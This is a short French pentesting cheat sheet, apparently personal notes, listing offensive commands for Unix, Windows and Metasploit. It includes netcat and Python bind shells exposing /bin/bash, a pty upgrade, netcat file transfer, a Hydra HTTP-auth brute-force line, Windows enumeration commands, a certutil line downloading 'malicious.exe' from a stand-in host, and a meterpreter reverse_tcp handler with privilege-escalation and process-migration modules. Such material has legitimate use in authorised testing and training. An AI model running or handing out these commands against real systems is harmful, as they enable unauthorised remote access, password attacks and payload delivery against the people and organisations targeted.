<h2>Unix</h2>
Accorder les permissions pour un user specifique

```
setfacl -m u:username:rwx myfolder
```
Tunnel ssh dynamique sur le port local 8080:

```
ssh -ND 8080 root@addressIP
```
Rebonds avec ssh:

```
ssh -J root@premier_rebond root@cible
```
Port forwarding avec ssh:

```
ssh -NL port_local:cible_distante:port_cible_distante root@rebond</br>
```
<h3>Obtenir un shell</h3>
Ouvrent un shell sur le port 2222 :

```
 nc -lvp 2222 -e /bin/bash
 python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```
On se connecte avec nc -nv 2222 adress port
<h4>Pour avoir un shell pty :</h4>

```
python -c "import pty; pty.spawn('/bin/bash')"
```
<h4>Pour avoir tab completion tout joli :</h4>
Prendre un shell pty avec la commande plus haut

```
 CTRL-Z
 stty raw -echo
 fg
```

Envoi fichier avec netcat :

```
nc -l -p 1234 > out.file
nc -w 3 [destination] 1234 < out.file
```

Hydra:</br>
http-auth bute force

```
hydra -L user.txt -P password.txt -t12 -f x.x.x.x http-get / -V
```

XfreeRDP:

```
xfreerdp /f +clipboard /kbd:0x0000040C /u:USERNAME@DOMAIN /p:PASSWORD /v:IP
```
<h2>Windows</h2>
`systeminfo` pour obtenir des renseignements sur le systeme</br>
`net users [username]` pour obtenir des renseignements sur les utilisateurs</br>
`tasklist` pour lister les processus</br>
`netstat -ano` pour les connexions reseau</br>
`dir sysprep /s /b` pour trouver un fichier dans le repertoire courant et ses sous-dossiers</br>
`wmic qfe list` pour lister les mises à jour installées</br>
`certutil.exe -urlcache -split -f "https://hackers.home/malicious.exe" bad.exe` le wget en cmd<br/>
`certutil.exe -decode bad.txt bad.exe` le base64 decode en cmd</br>

<h3>Powershell</h3>
`get-WmiObject -class Win32_Share`


<h2>Metasploit</h2>
Handler :

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.8.142
set LPORT 8888
set ExitOnSession false
exploit -j -z
```

use post/multi/recon/local_exploit_suggester</br>

`run post/windows/manage/migrate` pour changer sur un processus plus fiable</br>
